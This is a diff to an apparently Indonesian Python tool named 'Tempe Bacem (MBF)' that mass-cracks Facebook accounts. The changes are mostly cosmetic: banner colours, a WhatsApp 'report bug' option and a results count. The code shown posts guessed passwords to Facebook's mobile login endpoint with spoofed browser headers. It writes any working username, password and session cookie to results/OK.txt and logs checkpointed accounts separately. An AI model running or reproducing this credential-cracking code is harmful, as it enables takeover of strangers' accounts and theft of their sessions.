@@ -18,6 +18,7 @@ ses = requests.Session()
 ID = []
 uadia, uadarimu = [], []
 ok, cp, loop =[], [], 0
+sys.stdout.write('\x1b]2; BACEM | (MBF) \x07')
 
 P = '\x1b[1;97m' # PUTIH
 M = '\x1b[1;91m' # MERAH
@@ -36,6 +37,7 @@ O2 = "[#00FFFF]" # BIRU MUDA
 P2 = "[#FFFFFF]" # PUTIH
 J2 = "[#FF8F00]" # JINGGA
 A2 = "[#AAAAAA]" # ABU-ABU
+RC = random.choice([M2, H2, K2, J2, N2, A2, U2, B2, O2])
 
 day = datetime.now().strftime("%d-%b-%Y")
 nyMnD = 5
@@ -67,11 +69,11 @@ class login:
            
     def logoo(self):
         self.clear()
-        prints(Panel(f"""{H2}d8888b.  .d8b.   .o88b. d88888b .88b  d88. 
-88  `8D d8' `8b d8P  Y8 88'     88'YbdP`88  {P2}* Tempe Bacem ({H2}MBF{P2}){H2}
-88oooY' 88ooo88 8P      88ooooo 88  88  88  {P2}* Free {H2}For {P2}Everyone {H2}
+        prints(Panel(f"""{RC}d8888b.  .d8b.   .o88b. d88888b .88b  d88. 
+88  `8D d8' `8b d8P  Y8 88'     88'YbdP`88  {P2}* Tempe Bacem ({RC}MBF{P2}){RC}
+88oooY' 88ooo88 8P      88ooooo 88  88  88  {P2}* Free {RC}For {P2}Everyone {RC}
 88~~~b. 88~~~88 8b      88~~~~~ 88  88  88
-88   8D 88   88 Y8b  d8 88.     88  88  88  {P2}*{K2} Easy To Use {H2}
+88   8D 88   88 Y8b  d8 88.     88  88  88  {P2}*{K2} Easy To Use {RC}
 Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP""",padding=(0,7),style=f"#AAAAAA"))
     
     def loginEfbi(self):
@@ -111,11 +113,11 @@ class MulaiTools:
     
     def logoos(self):
         self.clear()
-        prints(Panel(f"""{H2}d8888b.  .d8b.   .o88b. d88888b .88b  d88. 
-88  `8D d8' `8b d8P  Y8 88'     88'YbdP`88  {P2}* Tempe Bacem ({H2}MBF{P2}){H2}
-88oooY' 88ooo88 8P      88ooooo 88  88  88  {P2}* Free {H2}For {P2}Everyone {H2}
+        prints(Panel(f"""{RC}d8888b.  .d8b.   .o88b. d88888b .88b  d88. 
+88  `8D d8' `8b d8P  Y8 88'     88'YbdP`88  {P2}* Tempe Bacem ({RC}MBF{P2}){RC}
+88oooY' 88ooo88 8P      88ooooo 88  88  88  {P2}* Free {RC}For {P2}Everyone {RC}
 88~~~b. 88~~~88 8b      88~~~~~ 88  88  88
-88   8D 88   88 Y8b  d8 88.     88  88  88  {P2}*{K2} Easy To Use {H2}
+88   8D 88   88 Y8b  d8 88.     88  88  88  {P2}*{K2} Easy To Use {RC}
 Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP""",padding=(0,7),style=f"#AAAAAA"))
 
     def dump(self):
@@ -135,7 +137,7 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP""",padding=(0,7),style=f"#AAAAAA"))
              time.sleep(3);exit()
          self.logoos()
          prints(Panel(f"{H2}{nama}",title=f"{P2}nama",subtitle=f"{P2}{id}",padding=(0,30),style=f"#AAAAAA"))
-         prints(Panel(f"{P2}[{H2}01{P2}]. crack dari id publik massal\n{P2}[{H2}02{P2}]. crack dari pencarian nama\n{P2}[{H2}03{P2}]. check hasil crack\n{P2}[{H2}00{P2}]. keluar tools ( {M2}hapus cookie {P2})",padding=(0,19),style=f"#AAAAAA"))
+         prints(Panel(f"{P2}[{H2}01{P2}]. crack dari id publik massal\n{P2}[{H2}02{P2}]. crack dari pencarian nama\n{P2}[{H2}03{P2}]. check hasil crack\n{P2}[{H2}04{P2}]. report bug script\n{P2}[{H2}00{P2}]. keluar tools ( {M2}hapus cookie {P2})",padding=(0,19),style=f"#AAAAAA"))
          askk = console.input(f" {P2}({H2}•{P2}) masukan pilihan : ")
          if askk in ['1','01']:
               prints(Panel(f"{P2}anda bisa menggunakan tanda (,) koma jika ingin lebih dari 1 id",padding=(0,6),style=f"#AAAAAA"))
@@ -153,6 +155,11 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP""",padding=(0,7),style=f"#AAAAAA"))
 
          elif askk in ['3','03']:
              self.viewResults()
+         
+         elif askk in ['4','04']:
+            prints(f" {P2}({H2}•{P2}) anda akan di arahkan ke WhatsApp")
+            os.system("xdg-open https://wa.me/+16143244921")
+            time.sleep(2);exit()
          
          elif askk in ['0','00']:
              os.system('rm -rf data/cokis.txt')
@@ -278,7 +285,8 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP""",padding=(0,7),style=f"#AAAAAA"))
                          xc.submit(self.metodeASYNC, uid, pwx)
                   except Exception as e:
                       pass
-        prints(f" {P2}({H2}•{P2}) crack telah selesai...")
+        print("\r")
+        prints(f" {P2}({H2}•{P2}) crack telah selesai... hasil OK-:{H2}{len(ok)}{P2} CP-:{K2}{len(cp)}{P2}")
         time.sleep(3);exit()
 
     def uasku(self):
@@ -323,17 +331,32 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP""",padding=(0,7),style=f"#AAAAAA"))
                     "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
                 
                  }
-                 head = {"Host": "m.facebook.com", "content-length": f"{str(len(data))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1), "user-agent": uaku, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": "https://m.facebook.com", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-                 r = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data=data, headers=head, allow_redirects=False)
+                 head = {
+                    "Host": "m.facebook.com",
+                    "content-length": f"{str(len(data))}",
+                    "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
+                    "user-agent": uaku,
+                    "content-type": "application/x-www-form-urlencoded",
+                    "accept": "*/*",
+                    "origin": "https://m.facebook.com",
+                    "x-requested-with": "mark.via.gp",
+                    "sec-fetch-site": "same-origin",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-dest": "empty",
+                    "referer": "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1",
+                    "accept-encoding": "gzip, deflate",
+                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+                    }
+                 r = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data = data, headers = head, allow_redirects=False)
                  if 'c_user' in ses.cookies.get_dict():
                      ok.append(user)
                      coki = ";".join([str(x)+'='+str(i) for x,i in ses.cookies.get_dict().items()])
-                     print(f"\r {H}[OK] {user} • {pw} • {coki}")
+                     print(f"\r {P}[{H}Live{P}] {H}{user}|{pw}|{coki}{P}")
                      open('results/OK.txt','a').write(f"{user}|{pw}|{coki}\n")
                      break
                  elif 'checkpoint' in ses.cookies.get_dict():
                      cp.append(user)
-                     print(f"\r {K}[CP] {user} • {pw}")
+                     print(f"\r {P}[{K}Check{P}] {K}{user}|{pw}                                        {P}")
                      open('results/CP.txt','a').write(f"{user}|{pw}\n")
                      break
                  else:
@@ -343,7 +366,7 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP""",padding=(0,7),style=f"#AAAAAA"))
         loop +=1
 
 if __name__ == '__main__':
-   try:os.system('git pull')
+   try:os.system("git pull")
    except:pass
    try:os.mkdir('results')
    except:pass
